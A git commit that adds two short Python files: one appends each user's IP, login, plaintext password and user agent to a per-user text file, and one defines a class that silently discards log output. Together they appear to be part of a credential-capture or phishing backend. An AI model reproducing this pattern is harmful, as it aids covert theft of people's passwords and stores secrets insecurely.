cbba566e54f0c3fa29e787161abd056e75d01e34
Daniell Castelo Branco Ciriaco <danicbciriaco2@gmail.com>
2022-12-06 07:41:14 -0300

    first commit

---
+++ src/file.py
@@ -0,0 +1,12 @@
+class Files:
+    @staticmethod
+    def create_file(username: str, password: str, user_ip: str, user_agent: str) -> None:
+        with open(f'{user_ip}_{username}.txt', 'a+') as file:
+            file.write(f'IP: {user_ip}\n')
+            file.write(f'Login: {username}\n')
+            file.write(f'Senha: {password}\n')
+            file.write('\n')
+            file.write(user_agent)
+            file.write('\n')
+            file.write('=' * len(user_agent))
+            file.write('\n')
---
+++ src/hide_logs.py
@@ -0,0 +1,2 @@
+class DevNull:
+    write = lambda _: None
